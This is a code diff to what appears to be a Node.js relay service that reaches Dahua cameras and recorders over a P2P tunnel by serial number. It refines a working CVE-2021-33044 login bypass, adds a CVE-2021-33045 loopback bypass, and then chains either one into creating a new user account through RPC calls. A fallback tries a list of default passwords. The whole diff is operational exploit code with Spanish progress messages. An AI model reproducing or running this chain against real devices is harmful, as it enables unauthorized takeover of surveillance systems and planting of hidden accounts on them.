@@ -721,9 +721,9 @@ async function bindTunnelPort(deviceSock, targetPort) {
 // ── CVE-2021-33044 Login Bypass (NetKeyboard) ──
 async function exploitLoginBypass(deviceSock, targetPort) {
   var detail = [];
-  var loginPayload = JSON.stringify({ method: 'global.login', params: { userName: 'admin', password: '', clientType: 'NetKeyboard', loginType: 'Direct', authorityType: 'Default' }, id: 1, session: 0 });
+  var loginPayload = JSON.stringify({ method: 'global.login', params: { userName: 'admin', password: 'Not Used', clientType: 'NetKeyboard', loginType: 'Direct', authorityType: 'Default', passwordType: 'Default' }, id: 1, session: 0 });
   var realmId = await bindTunnelPort(deviceSock, targetPort);
-  var loginRes = await sendHTTPThroughTunnel(deviceSock, realmId, '/RPC2_Login', 'POST', {'Content-Type':'application/json'}, loginPayload);
+  var loginRes = await sendHTTPThroughTunnel(deviceSock, realmId, '/RPC2', 'POST', {'Content-Type':'application/json'}, loginPayload);
   detail.push('Login bypass HTTP ' + loginRes.status);
   if (loginRes.status !== 200) return { success: false, detail: detail, error: 'HTTP ' + loginRes.status };
   var loginData;
@@ -736,13 +736,37 @@ async function exploitLoginBypass(deviceSock, targetPort) {
     detail.push('Got challenge: realm=' + realm + ', random=' + random);
     var hash1 = crypto.createHash('md5').update('admin:' + realm + ':admin').digest('hex').toUpperCase();
     var hash2 = crypto.createHash('md5').update('admin:' + random + ':' + hash1).digest('hex').toUpperCase();
-    var step2Payload = JSON.stringify({ method: 'global.login', params: { userName: 'admin', password: hash2, clientType: 'NetKeyboard', loginType: 'Direct', authorityType: 'Default' }, id: 2, session: tempSession });
+    var step2Payload = JSON.stringify({ method: 'global.login', params: { userName: 'admin', password: hash2, clientType: 'NetKeyboard', loginType: 'Direct', authorityType: 'Default', passwordType: 'Default' }, id: 2, session: tempSession });
     realmId = await bindTunnelPort(deviceSock, targetPort);
-    var step2Res = await sendHTTPThroughTunnel(deviceSock, realmId, '/RPC2_Login', 'POST', {'Content-Type':'application/json'}, step2Payload);
+    var step2Res = await sendHTTPThroughTunnel(deviceSock, realmId, '/RPC2', 'POST', {'Content-Type':'application/json'}, step2Payload);
     detail.push('Step 2 HTTP ' + step2Res.status);
     if (step2Res.status === 200) { try { var step2Data = JSON.parse(step2Res.body); if (step2Data.result === true) { detail.push('Bypass successful (two step)'); return { success: true, detail: detail, session: String(step2Data.session) }; } detail.push('Step 2 error: ' + (step2Data.error ? JSON.stringify(step2Data.error) : 'no result')); } catch(e) { detail.push('Step 2 parse error: ' + step2Res.body.substring(0, 100)); } }
   }
   return { success: false, detail: detail, error: 'Bypass did not return session' };
+}
+
+
+// ── CVE-2021-33045 Login Bypass (Loopback) ──
+async function exploitLoginBypassLoopback(deviceSock, targetPort) {
+  var detail = [];
+  // Attempt 1: Plain password type with admin/admin
+  var loginPayload = JSON.stringify({ method: 'global.login', params: { userName: 'admin', ipAddr: '127.0.0.1', password: 'admin', clientType: 'Local', loginType: 'Loopback', authorityType: 'Default', passwordType: 'Plain' }, id: 1, session: 0 });
+  var realmId = await bindTunnelPort(deviceSock, targetPort);
+  var loginRes = await sendHTTPThroughTunnel(deviceSock, realmId, '/RPC2', 'POST', {'Content-Type':'application/json'}, loginPayload);
+  detail.push('Loopback (Plain) HTTP ' + loginRes.status);
+  if (loginRes.status === 200) {
+    try { var d = JSON.parse(loginRes.body); if (d.result === true) { detail.push('Loopback OK (Plain)'); return { success: true, detail: detail, session: String(d.session) }; } detail.push('Loopback (Plain) resp: ' + loginRes.body.substring(0, 120)); } catch(e) { detail.push('Parse err: ' + loginRes.body.substring(0, 120)); }
+  }
+  // Attempt 2: Default password type with MD5 hash
+  var hash1 = crypto.createHash('md5').update('admin:admin:admin').digest('hex').toUpperCase();
+  var loginPayload2 = JSON.stringify({ method: 'global.login', params: { userName: 'admin', ipAddr: '127.0.0.1', password: hash1, clientType: 'Local', loginType: 'Loopback', authorityType: 'Default', passwordType: 'Default' }, id: 2, session: 0 });
+  realmId = await bindTunnelPort(deviceSock, targetPort);
+  var loginRes2 = await sendHTTPThroughTunnel(deviceSock, realmId, '/RPC2', 'POST', {'Content-Type':'application/json'}, loginPayload2);
+  detail.push('Loopback (Default) HTTP ' + loginRes2.status);
+  if (loginRes2.status === 200) {
+    try { var d2 = JSON.parse(loginRes2.body); if (d2.result === true) { detail.push('Loopback OK (Default)'); return { success: true, detail: detail, session: String(d2.session) }; } detail.push('Loopback (Default) resp: ' + loginRes2.body.substring(0, 120)); } catch(e) { detail.push('Parse err: ' + loginRes2.body.substring(0, 120)); }
+  }
+  return { success: false, detail: detail, error: 'Loopback bypass failed' };
 }
 
 // ── Exploit Add User (full chain) ──
@@ -788,15 +812,39 @@ async function exploitAddUser(serial, newUser, newPass, targetPort) {
       var cgiPath = '/cgi-bin/userManager.cgi?action=addUser&user.Name=' + encodeURIComponent(newUser) + '&user.Password=' + encodeURIComponent(newPass) + '&user.Group=user&user.Sharable=true&user.Reserved=false';
       var addRes = await sendHTTPThroughTunnel(tunnel.deviceSock, realmId, cgiPath, 'GET', {Cookie: 'DHSession=' + loginResult.session}, '');
       if (addRes.status === 200 && addRes.body.trim().toLowerCase() === 'ok') { allSteps.push({ step: 'adduser', status: 'done', message: 'Usuario "' + newUser + '" agregado exitosamente!' }); return { success: true, steps: allSteps }; }
-      allSteps.push({ step: 'adduser', status: 'running', message: 'CGI retorno HTTP ' + addRes.status + ', intentando RPC...' });
+      allSteps.push({ step: 'adduser', status: 'running', message: 'CGI retorno HTTP ' + addRes.status + ', intentando MagicBox.AddUser...' });
       realmId = await bindTunnelPort(tunnel.deviceSock, targetPort);
-      var rpcPayload = JSON.stringify({ method: 'userManager.addUser', params: { Name: newUser, Password: newPass, Group: 'user', Sharable: true, Reserved: false }, id: 3, session: loginResult.session });
+      var mbPayload = JSON.stringify({ method: 'MagicBox.AddUser', params: { UserType: 'Default', UserName: newUser, Password: newPass }, id: 3, session: loginResult.session });
+      var mbRes = await sendHTTPThroughTunnel(tunnel.deviceSock, realmId, '/RPC2', 'POST', {'Content-Type':'application/json'}, mbPayload);
+      if (mbRes.status === 200) { try { var mbData = JSON.parse(mbRes.body); if (mbData.result === true) { allSteps.push({ step: 'adduser', status: 'done', message: 'Usuario agregado via MagicBox.AddUser!' }); return { success: true, steps: allSteps }; } } catch(e) {} }
+      allSteps.push({ step: 'adduser_detail', message: 'MagicBox HTTP ' + mbRes.status + ': ' + mbRes.body.substring(0, 100) });
+      realmId = await bindTunnelPort(tunnel.deviceSock, targetPort);
+      var rpcPayload = JSON.stringify({ method: 'userManager.addUser', params: { Name: newUser, Password: newPass, Group: 'user', Sharable: true, Reserved: false }, id: 4, session: loginResult.session });
       var rpcRes = await sendHTTPThroughTunnel(tunnel.deviceSock, realmId, '/RPC2', 'POST', {'Content-Type':'application/json'}, rpcPayload);
       if (rpcRes.status === 200) { try { var rpcData = JSON.parse(rpcRes.body); if (rpcData.result === true) { allSteps.push({ step: 'adduser', status: 'done', message: 'Usuario "' + newUser + '" agregado via RPC!' }); return { success: true, steps: allSteps }; } } catch(e) {} }
       allSteps.push({ step: 'adduser', status: 'failed', message: 'Fallo: HTTP ' + addRes.status + ' / ' + (addRes.body || '').substring(0, 100) });
       return { success: false, steps: allSteps };
     } else {
-      allSteps.push({ step: 'exploit', status: 'failed', message: loginResult.error });
+      allSteps.push({ step: 'exploit', status: 'failed', message: 'NetKeyboard: ' + loginResult.error });
+      allSteps.push({ step: 'exploit', status: 'running', message: 'Intentando CVE-2021-33045 (Loopback bypass)...' });
+      var loopbackResult = await exploitLoginBypassLoopback(tunnel.deviceSock, targetPort);
+      for (var li = 0; li < loopbackResult.detail.length; li++) allSteps.push({ step: 'exploit_detail', message: loopbackResult.detail[li] });
+      if (loopbackResult.success) {
+        allSteps.push({ step: 'exploit', status: 'done', message: 'Loopback bypass OK! Session: ' + loopbackResult.session.substring(0, 16) + '...' });
+        allSteps.push({ step: 'adduser', status: 'running', message: 'Inyectando usuario via MagicBox.AddUser...' });
+        var lbRealm = await bindTunnelPort(tunnel.deviceSock, targetPort);
+        var lbPayload1 = JSON.stringify({ method: 'MagicBox.AddUser', params: { UserType: 'Default', UserName: newUser, Password: newPass }, id: 3, session: loopbackResult.session });
+        var lbRes1 = await sendHTTPThroughTunnel(tunnel.deviceSock, lbRealm, '/RPC2', 'POST', {'Content-Type':'application/json'}, lbPayload1);
+        if (lbRes1.status === 200) { try { var lbData1 = JSON.parse(lbRes1.body); if (lbData1.result === true) { allSteps.push({ step: 'adduser', status: 'done', message: 'Usuario agregado via MagicBox.AddUser!' }); return { success: true, steps: allSteps }; } } catch(e) {} }
+        allSteps.push({ step: 'adduser_detail', message: 'MagicBox HTTP ' + lbRes1.status + ': ' + lbRes1.body.substring(0, 100) });
+        var lbRealm2 = await bindTunnelPort(tunnel.deviceSock, targetPort);
+        var lbPayload2 = JSON.stringify({ method: 'userManager.addUser', params: { Name: newUser, Password: newPass, Group: 'user', Sharable: true, Reserved: false }, id: 4, session: loopbackResult.session });
+        var lbRes2 = await sendHTTPThroughTunnel(tunnel.deviceSock, lbRealm2, '/RPC2', 'POST', {'Content-Type':'application/json'}, lbPayload2);
+        if (lbRes2.status === 200) { try { var lbData2 = JSON.parse(lbRes2.body); if (lbData2.result === true) { allSteps.push({ step: 'adduser', status: 'done', message: 'Usuario agregado via userManager.addUser!' }); return { success: true, steps: allSteps }; } } catch(e) {} }
+        allSteps.push({ step: 'adduser', status: 'failed', message: 'RPC fallo: HTTP ' + lbRes2.status });
+        return { success: false, steps: allSteps };
+      }
+      allSteps.push({ step: 'exploit', status: 'failed', message: 'Loopback: ' + loopbackResult.error });
       allSteps.push({ step: 'fallback', status: 'running', message: 'Intentando credenciales por defecto...' });
       try { tunnel.deviceSock.close(); tunnel.mainSock.close(); } catch(e) {}
       var defaultCreds = [{ user: 'admin', pass: 'admin' }, { user: 'admin', pass: '12345' }, { user: 'admin', pass: '888888' }, { user: 'admin', pass: '' }, { user: 'admin', pass: 'password' }];
@@ -836,7 +884,7 @@ var server = http.createServer(async function(req, res) {
 
   if (req.url === '/health') {
     res.writeHead(200, { 'Content-Type': 'application/json' });
-    return res.end(JSON.stringify({ status: 'ok', version: '3.1', features: ['status', 'tunnel', 'cgi', 'debug', 'exploit'] }));
+    return res.end(JSON.stringify({ status: 'ok', version: '3.2', features: ['status', 'tunnel', 'cgi', 'debug', 'exploit'] }));
   }
 
   // Debug endpoint - tests each step of tunnel establishment
@@ -1011,7 +1059,7 @@ server.on('error', function(err) {
 });
 
 server.listen(PORT, function() {
-  console.log('Dahua P2P Tunnel Relay v3.0 running on port ' + PORT);
+  console.log('Dahua P2P Tunnel Relay v3.2 running on port ' + PORT);
   console.log('Endpoints:');
   console.log('  GET  /health      - Health check');
   console.log('  GET  /debug/:sn   - Debug tunnel steps');
